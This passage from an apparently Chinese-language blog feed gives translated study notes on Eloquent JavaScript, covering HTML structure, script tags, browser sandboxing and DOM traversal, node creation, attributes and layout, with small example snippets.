<h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p>HTML，代表超文本标记语言，是用于网页的文档格式。一个HTML文档除了给出文本结构的标签，用于描述链接，段落和标题等，还包括文本。</p>
<p>一个HTML文档可能看上去像这样：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>My home page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>My home page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello, I am Marijn and this is my home page.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>I also wrote a book! Read it</span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://eloquentjavascript.net"</span>&gt;</span>here<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>包裹在尖括号（&lt;&gt;）的标签，提供关于文档结构的信息。其他的文本就是普通的文字。</p>
<p>文档以<code>&lt;!doctype html&gt;</code>开头，告诉浏览器将这个页面解释位现代HTML，不同于使用在过去的各种各样的方言。</p>
<p>HTML文档有一个head和一个body。head包含关于文档的信息，body包含文档本身。在这个例子中，head声明了文档的标题为”My home page”，并且使用UTF-8编码，这是一种将Unicode文本编码为二进制数据的方式。文档的body包含了标题和两个段落。</p>
<p>标签以多种形式出现。一个元素，如body，一个段落或者一个链接，开始于opening tag像<code>&lt;p&gt;</code>，并终止于closing tag像<code>&lt;/p&gt;</code>。一些opening tag，例如链接的那个，以name=”value”的形式包含额外的信息。这些被叫做属性。在这个例子中，连接的终点用href=”<a href="http://eloquentjavascript.net&quot;来表示，href代表hypertext" target="_blank" rel="noopener">http://eloquentjavascript.net&quot;来表示，href代表hypertext</a> reference。</p>
<p>一些标签不包含任何东西因此不需要闭合。元标签<code>&lt;meta charset=&quot;utf-8&quot;&gt;</code>就是这样的例子。</p>
<p>为了能够在文档的文本中包含尖括号，即使它们在HTML中有特殊的含义，另一种形式的特殊标记必须引入。一个普通的开始尖括号写作<code>&amp;lt;</code>，一个关闭尖括号写作<code>&amp;gt;</code>。HTML中，&amp;符号后面跟着一个名字或者字符代码和一个分号被叫做实体（entity），并会由它编码的字符代替。</p>
<p>这类似于JS中反斜线使用的方式，因为这种机制也给了&amp;符号一个特殊的意义，它们就需要被转义为<code>&amp;amp;</code>。在包装在双引号的属性值中，<code>&amp;quot;</code>可以被用于插入一个实际的引号字符。</p>
<p>HTML以一种极度能容忍错误的方式解析。当应该在的标签丢失的时候，浏览器重新构建他们。以何种方式实现已经被标准化了，所以你可以在现代浏览器中依赖这个。</p>
<p>下面的文档将会和刚刚的文档一样看待。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">utf-8</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>My home page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>My home page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello, I am Marijn and this is my home page.</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>I also wrote a book! Read it</span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">http://eloquentjavascript.net</span>&gt;</span>here<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.</span><br></pre></td></tr></table></figure>

<p><code>&lt;html&gt;&lt;head&gt;&lt;body&gt;</code>标签完全丢失了。浏览器知道<code>&lt;meta&gt;&lt;title&gt;</code>在head中并且<code>&lt;h1&gt;</code>意味着bidy开始了。此外，我没有明确关闭一个段落，因为开始一个新的段落或者结束文档将隐式闭合它们。属性值的引号也省略了。</p>
<p>这本书经常会忽略<code>&lt;html&gt;&lt;head&gt;&lt;body&gt;</code>标签来使得行文简洁而不过分杂乱。但是我将会闭合标签并且在属性周围包含引号。</p>
<p>我也经常会忽略doctype和<code>charset</code>声明。并不鼓励你从HTML文档中忽略这些。当你丢弃这些的时候浏览器通常会做一些荒谬的事情。即便doctype和charset没有明确展示在文本中，你也应该隐式默认它们在。</p>
<h2 id="HTML和JavaScript"><a href="#HTML和JavaScript" class="headerlink" title="HTML和JavaScript"></a>HTML和JavaScript</h2><p>在这本书的上下文中，最重要的HTML标签就是<code>&lt;script&gt;</code>。这个标签允许我们在文档中包含一段JS代码。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Testing alert<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"hello!"</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当浏览器读取HTML的时候一遇到script标签这个script就会立刻运行。这个页面会弹出一个对话框——alert类似prompt，在弹窗这方面，但是不会询问输入。</p>
<p>直接在文档中嵌入大型程序通常不切实际。<code>&lt;script&gt;</code>标签可以通过src属性从一个URL获取一个script文件。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Testing alert<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"code/hello.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><em>code/hello.js</em>包含了同样的程序——<code>alert(&quot;hello!&quot;)</code>。当HTML页面引用其他的URL作为自己的一部分时——如一个图片或者一个script——浏览器将立刻检索它们并将其包含到页面中。</p>
<p>一个script标签必须总是以<code>&lt;/script&gt;</code>关闭，即使他引用不包含任何代码的script文件。如果你忘记这个，页面的剩余部分都会被解释为script的一部分。</p>
<p>可以在浏览器中通过给script一个<code>type=&quot;module&quot;</code>属性来加载ES模块（参见第十章）。这样的模块可以通过在import声明中使用相对于他们的URL作为模块名来依赖其他模块。</p>
<p>一些属性也可以包含一个JS程序。下面展示的<code>&lt;button&gt;</code>标签（作为按钮展示）有一个onclick属性。当按钮被点击时属性值运行。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"alert('Boom!');"</span>&gt;</span>DO NOT PRESS<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意我在onclick属性中的字符串使用了单引号，因为双引号已经被用于引用整个属性了。我也可以用<code>&amp;quot;</code>。</p>
<h2 id="在沙箱中"><a href="#在沙箱中" class="headerlink" title="在沙箱中"></a>在沙箱中</h2><p>运行从互联网上下载的程序具有潜在的危险性。你不太了解你所访问网站背后的人，他们也不一定是善意的。运行非善意人写的程序容易让你的电脑被病毒感染，你的数据被偷，并且你的账户被黑客攻击。</p>
<p>尽管web的吸引力就是你可以不需要信任你所访问的所有页面的浏览它。这就是为什么浏览器极大限制了JS程序可以做的事情：他不能访问你计算机的文件或者修改任何与JS嵌入网页无关的任何东西。</p>
<p>以这种方式隔离一个编程环境叫做沙盒化（sandboxing）。</p>
<p>沙盒最困难的部分在于允许程序有足够有用的空间同时还限制它们做危险的事情。许多有用的功能，如和其他服务器通信或者读取剪切板的内容，也可以被用于做有问题，侵犯隐私的事情。</p>
]]></content>
      <categories>
        <category>Eloquent JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>EJ14</title>
    <url>/2019/01/15/EJ14/</url>
    <content><![CDATA[<h1 id="文档对象模型"><a href="#文档对象模型" class="headerlink" title="文档对象模型"></a>文档对象模型</h1><p>当你在浏览器中打开一个网页的时候，浏览器获取到页面的HTML文本并解析它，非常像我们12章的解析器。浏览器构建一个文档结构的模型，并使用这个模型在屏幕上绘画页面。</p>
<p>这个文档的表示就是JS在它的沙箱里可以获得的玩具之一。它是一个你可以读取或者修改的数据结构。它表现得像一个动态的数据结构：当被修改的时候看，屏幕上的页面就会更新来反映这种变化。</p>
<h2 id="文档结构"><a href="#文档结构" class="headerlink" title="文档结构"></a>文档结构</h2><p>你可以把HTML文档想象为一个嵌套的盒子集合。像<code>&lt;body&gt;&lt;/body&gt;</code>包围其他的标签，这些被包围的标签返回来又包含其他标签或者文本。这有一个例子：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>My home page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>My home page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello, I am Marijn and this is my home page.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>I also wrote a book! Read it</span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://eloquentjavascript.net"</span>&gt;</span>here<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>页面有如下结构</p>


<p>浏览器用于表示文档的数据结构遵循这种形状。对于每个盒子，有一个我们可以交互的对象，我们可以发现它代表的HTML标签以及包含的盒子和文本。这种表示叫做文档对象模型，或者简言之DOM。</p>
<p>全局绑定<code>document</code>赋予我们获取这些对象的能力。<code>documentElement</code>属性指的是表示<code>&lt;html&gt;</code>标签的对象。因为每个HTML文档有一个head和一个body，它也有head和body属性，指向那些元素。</p>
<h2 id="树"><a href="#树" class="headerlink" title="树"></a>树</h2><p>回想一下12章的语法树。他们的结构非常类似浏览器文档的结构。每一个节点可能引用其他的儿子节点，反过来也可能有它们的儿子节点。这种形状在嵌套的结构中很典型，元素可以包含类似于它们自己的子元素。</p>
<p>我们将这样的数据结构叫做树，当他有一个分支结构时，没有环路（一个节点不能包含自己，直接或间接都不行），并且有一个单一的定义良好的根。在DOM中，<code>document.documentElement</code>作为根元素存在。</p>
<p>在计算机科学中树经常出现。除了表示如HTML文档或者程序这样的递归结构，他们经常被用于维护有序的数据集，因为元素相比在普通数组中，可以更高效的查找或者插入。</p>
<p>一个典型的树有不同种类的节点。egg语言的语法树有标识符，值和应用节点（application node）。应用节点可能包含儿子，而标识符和值是叶子节点，或者说是不包含儿子的节点。</p>
<p>DOM的元素节点也是一样，它们代表HTML标签，决定了文档的结构。这些可以有儿子节点。这样的节点的一个例子就是<code>document.body</code>。这些儿子节点中的一些可能是叶子节点，如文本或者注释节点。</p>
<p>每一个DOM节点对象拥有一个<code>nodeType</code>属性，包含一个数字代码标识节点类型。元素的代码为1，也定义在常量属性<code>Node.ELEMENT_NODE</code>中。文本节点，代表文档中的一部分文本，代码为3（<code>Node.TEXT_NODE</code>）。注释代码为8（<code>Node.COMMENT_NODE</code>）。</p>
<p>另一种可视化我们文档树的方式如下：</p>


<p>文本节点作为叶子节点，箭头用来表明节点间的父子关系。</p>
<h2 id="标准"><a href="#标准" class="headerlink" title="标准"></a>标准</h2><p>使用神秘的数字代码标识节点类型不是像JS做的事情。本章的稍后将会看到DOM接口的其他部分同样笨重并且陌生。原因就是DOM接口不仅是为JS设计的。相反，它尽力成为一个语言中立的接口来使得自己也可以被用到其它系统——不仅是HTML也包括XML，XML是一种有着类HTML语法的通用数据格式。</p>
<p>这是不幸的。标准通常是有用的。但是这种情况下，优势（跨语言一致性）并不是那么引人注目的。有一个和所使用的语言恰当集成的接口要省不少时间，比起跨语言使用熟悉的接口。</p>
<p>作为这种不好集成的一个例子，考虑dom中元素节点的<code>childNodes</code>属性。这个属性保存了一个类数组的对象，有一个<code>length</code>属性和一些以数字为标签的属性用来获取子节点。但是它是<code>NodeList</code>类型的一个实例，并不是一个真正的数组，所以没有<code>slice</code>和<code>map</code>方法。</p>
<p>还有一些问题仅仅是糟糕的设计。例如，没有办法创建一个新节点并立刻向上面添加儿子节点或者属性。相反，你必须首先创建它，并且使用副作用一个接一个添加儿子和属性。与DOM交互的代码很长，重复并且丑陋。</p>
<p>但是这些缺陷并不致命。因为JS允许我们创造自己的抽象，设计改进的方式来表达你执行的操作是可能的。浏览器编程的许多库都带有这些工具。</p>
<h2 id="遍历树"><a href="#遍历树" class="headerlink" title="遍历树"></a>遍历树</h2><p>DOM节点包含许多到其他临近节点的链接。如图：</p>


<p>即使图只展示了每种类型的一个链接，每个节点都有一个<code>parentNode</code>属性指向它的父节点（如果有的话）。类似的，每个元素节点（节点类型1）有一个<code>childNodes</code>属性指向一个保存它儿子节点的类数组对象。</p>
<p>理论上，你可以使用这些父子链接来在树中做任何移动。但是JS也给你获取一些额外的方便的链接。<code>firstChild</code>和<code>lastChild</code>属性指向第一个和最后一个子元素或者对于没有孩子的节点值为null。相似地，<code>previousSibling</code>和<code>nextSibling</code>指向邻近的节点，就是同一个父节点下的立刻出现在他们之前的节点和它们之后的节点。对于第一个儿子，<code>previousSibling</code>将会为null，而对于最后一个儿子，<code>nextSibling</code>为null。</p>
<p>还有一个<code>children</code>属性，类似于<code>childNodes</code>属性但是只包含元素（类型1）儿子，没有其他类型的儿子节点。当你对文本节点不感兴趣时这是有用的。</p>
<p>当处理类似这个的嵌套数据结构时，递归函数通常很有用。下面的函数扫描一个文档的包含给定字符串的文本节点并且当发现的时候返回<code>true</code>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">talksAbout</span>(<span class="params">node, string</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(node.nodeType == Node.ELEMETN_NODE) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; node.childNodes.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(talksAbout(node.childNodes[i], string)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (node.nodeType == Node.TEXT_NODE) &#123;</span><br><span class="line">        <span class="keyword">return</span> node.nodeValue.indexOf(string) &gt; <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(talksAbout(<span class="built_in">document</span>.body, <span class="string">"book"</span>));</span><br><span class="line"><span class="comment">// -&gt; true</span></span><br></pre></td></tr></table></figure>

<p>因为<code>childNodes</code>不是一个真正的数组，我们不能用<code>for/of</code>遍历，并且必须使用常规的<code>for</code>循环或者使用<code>Array.from</code>。</p>
<p>文本节点的<code>nodeValue</code>属性保存了它表示的文本字符串。</p>
<h2 id="发现元素"><a href="#发现元素" class="headerlink" title="发现元素"></a>发现元素</h2><p>在这些父子兄弟之间导航这些链接很有用。但是如果我们想要在一个文档中找到特定的节点，通过在<code>document.body</code>开始并且遵循一个固定的路径是错误的主意。这样做会对我们的文档结构做出假设——随后还可能会改变结构。另一个复杂的因素是即使对于节点间的空白文本节点也会创建。例子中的document的<code>&lt;body&gt;</code>标签不仅只有三个孩子（<code>&lt;h1&gt;</code>和两个<code>&lt;p&gt;</code>），实际上有七个节点：这三个，加上前后的空白以及中间的空白。</p>
<p>所以如果我们想要在文档中获取链接的<code>href</code>属性，我们不想要说类似”获取document body第六个孩子的第二个孩子”这样的话语。如果我们说“获取document中的第一个链接”更好。我们当然可以这样做。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> link = <span class="built_in">document</span>.body.getElementsByTagName(<span class="string">"a"</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="built_in">console</span>.log(link.href);</span><br></pre></td></tr></table></figure>

<p>所有的元素节点有一个<code>getElementsByTagName</code>方法，收集所有给定标签名字的元素，直接或者间接eider那个节点的孩子并且将其作为一个类数组对象返回。</p>
<p>为了找到一个特定的单个节点，你可以给它一个id属性并且使用<code>document.getElementById</code>来代替。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>My ostrich Gertrude:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">"gertrude"</span> <span class="attr">src</span>=<span class="string">"img/ostrich.png"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> ostrich = <span class="built_in">document</span>.getElementById(<span class="string">"gertrude"</span>);</span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(ostrich.src);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>第三种相似的方法是<code>getElementsByClassName</code>，类似于<code>getElementsByTagName</code>，搜索元素节点的内容，并且检索所有在他们<code>class</code>属性中包含给定字符串的元素。</p>
<h2 id="改变document"><a href="#改变document" class="headerlink" title="改变document"></a>改变document</h2><p>几乎所有的关于DOM数据结构的东西可以被改变。通过改变父子关系文档树的形状可以被改变。节点有一个<code>remove</code>方法来从他们当前的父节点中移除它们。为了向一个元素节点添加一个子节点，我们可以使用<code>appendChild</code>，将子节点添加在孩子节点列表的末尾，或者<code>insertBefore</code>，将第一个参数节点插入到第二个参数节点之前。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>One<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Two<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Three<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> paragraphs = <span class="built_in">document</span>.body.getElementsByTagName(<span class="string">"p"</span>);</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.body.insertBefore(paragraphs[<span class="number">2</span>], paragraphs[<span class="number">0</span>]);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>一个节点只能在文档中占据一个位置。因此，将段落3插入到段落一前面将首先从文档末尾移除它并且然后在前面插入它，导致312的顺序。所有插入结点的操作，作为一种副作用都会导致它被从当前位置移除（如果有的话）。</p>
<p><code>replaceChild</code>方法被用于用另一个节点替换一个孩子节点。接受一个新节点参数和另一个要被替换的节点。被替换的节点必须是方法调用的对象的孩子。注意<code>replaceChild</code>和<code>insertBefore</code>期望新节点是它们的第一个参数。</p>
<h2 id="创造节点"><a href="#创造节点" class="headerlink" title="创造节点"></a>创造节点</h2><p>假如我们想要书写一个script，来将document中所有图片标签替换成其alt属性中的文字。</p>
<p>这不仅涉及到移除图片，同时还要添加一个新的文本节点来替换他们。文本节点使用<code>document.createTextNode</code>方法创建。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/cat.png"</span> <span class="attr">alt</span>=<span class="string">"Cat"</span>&gt;</span> in the</span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hat.png"</span> <span class="attr">alt</span>=<span class="string">"Hat"</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"replaceImages()"</span>&gt;</span>Replace<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="function"><span class="keyword">function</span> <span class="title">replaceImages</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> images = <span class="built_in">document</span>.body.getElementsByTagName(<span class="string">"img"</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> i = images.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> image = images[i];</span></span><br><span class="line">      if (image.alt) &#123;</span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> text = <span class="built_in">document</span>.createTextNode(image.alt);</span></span><br><span class="line">        image.parentNode.replaceChild(text, image);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>给定一个字符串，<code>createTextNode</code>创造一个我们可以用于插入文档的文本节点并且让他展示在屏幕上。</p>
<p>循环开始于列表末尾的图片。这是必须的，因为由方法类似<code>getElementsByTagName</code>（或是一个类似<code>childNodes</code>的属性）返回的节点列表是实时变化的。也就是随着文档变化而变化。如果我们从前面开始，移除第一个图片将会导致列表失去它的第一个元素，所以第二次循环重复的时候，i为1，循环将会停止，因为集合的长度也为1了。</p>
<p>如果你想要一个可靠的节点集合，对应于一个实时变化的，你可以通过调用<code>Array.from</code>来转换集合到一个真正的数组。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arrayish = &#123;<span class="number">0</span>: <span class="string">"one"</span>, <span class="number">1</span>: <span class="string">"two"</span>, <span class="attr">length</span>: <span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> array = <span class="built_in">Array</span>.from(arrayish);</span><br><span class="line"><span class="built_in">console</span>.log(array.map(<span class="function"><span class="params">s</span> =&gt;</span> s.toUpperCase()));</span><br><span class="line"><span class="comment">// → ["ONE", "TWO"]</span></span><br></pre></td></tr></table></figure>

<p>为了创建元素节点，你可以使用<code>document.createElement</code>方法。这个方法接受一个标签名称并且返回一个给定类型的新的空节点。</p>
<p>下面的例子定义了一个实用函数<code>elt</code>，创造一个元素节点，并且将剩下的参数看作是该节点的孩子节点。函数然后被用于向一个引言添加来源。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blockquote</span> <span class="attr">id</span>=<span class="string">"quote"</span>&gt;</span></span><br><span class="line">  No book can ever be finished. While working on it we learn</span><br><span class="line">  just enough to find it immature the moment we turn away</span><br><span class="line">  from it.</span><br><span class="line"><span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="function"><span class="keyword">function</span> <span class="title">elt</span><span class="params">(type, <span class="rest_arg">...children</span>)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> node = <span class="built_in">document</span>.createElement(type);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> child <span class="keyword">of</span> children) &#123;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">if</span> (<span class="keyword">typeof</span> child != <span class="string">"string"</span>) node.appendChild(child);</span></span><br><span class="line"><span class="javascript">      <span class="keyword">else</span> node.appendChild(<span class="built_in">document</span>.createTextNode(child));</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> node;</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.getElementById(<span class="string">"quote"</span>).appendChild(</span></span><br><span class="line"><span class="actionscript">    elt(<span class="string">"footer"</span>, <span class="string">"—"</span>,</span></span><br><span class="line"><span class="actionscript">        elt(<span class="string">"strong"</span>, <span class="string">"Karl Popper"</span>),</span></span><br><span class="line"><span class="actionscript">        <span class="string">", preface to the second editon of "</span>,</span></span><br><span class="line"><span class="actionscript">        elt(<span class="string">"em"</span>, <span class="string">"The Open Society and Its Enemies"</span>),</span></span><br><span class="line"><span class="actionscript">        <span class="string">", 1950"</span>));</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>一些元素属性，比如链接的<code>href</code>属性，可以通过元素的DOM对象的同名属性获取。这是最常用的标准属性的情况。</p>
<p>但是HTML允许你设置任何你想要在节点上的属性。因为它允许我们在文档中存储额外的信息这是很有用的。如果你捏造自己的属性名，即便这样的属性不会在元素的节点上作为属性呈现。你必须使用<code>getAttribute</code>和<code>setAttribute</code>方法来和他们交互。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">data-classified</span>=<span class="string">"secret"</span>&gt;</span>The launch code is 00000000.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">data-classified</span>=<span class="string">"unclassified"</span>&gt;</span>I have two feet.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> paras = <span class="built_in">document</span>.body.getElementsByTagName(<span class="string">"p"</span>);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">for</span> (<span class="keyword">let</span> para <span class="keyword">of</span> <span class="built_in">Array</span>.from(paras)) &#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">if</span> (para.getAttribute(<span class="string">"data-classified"</span>) == <span class="string">"secret"</span>) &#123;</span></span><br><span class="line">      para.remove();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>推荐在这样捏造的属性前面加上<code>data-</code>前缀来确保他们不和其他任何属性冲突。</p>
<p>有一个常用的属性<code>class</code>，是JS语言的一个关键字。由于历史原因——一些古老的JS实现不能够处理匹配关键字的属性名——用于获取这个attribute的property因此被叫做<code>className</code>。你也可以用它的真名获取<code>class</code>，通过使用<code>getAttribute</code>和<code>setAttribute</code>方法。</p>
<h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><p>你可能已经注意到了不同类型的元素以不同的方式布局。一些类似于p标签和标题标签的元素，占据文档的全部宽度，并且在独立的行上渲染。这些被叫做块级元素。而类似a标签和strong标签，和它们周围的文本在同一行上渲染。这样的元素叫做行内元素。</p>
<p>对于任何给定的文档，浏览器能够计算一个布局，基于每个元素的类型和内容给出大小和位置。这个布局然后就被用于绘画文档。</p>
<p>元素的大小和位置可以通过JS获取。<code>offsetWidth</code>和<code>offsetHeight</code>属性告诉你元素占据的像素空间。一个像素是浏览器中的度量的最基本单位。它传统上对应于屏幕可以绘画的最小的点，但是在现代浏览器上可以画非常小的点，可能就不是这样了，一个浏览器像素可能跨越多个显示点。</p>
<p>相似地，<code>clientWidth</code>和<code>clientHeight</code>给出元素内部的空间大小，忽略边框宽度。</p>
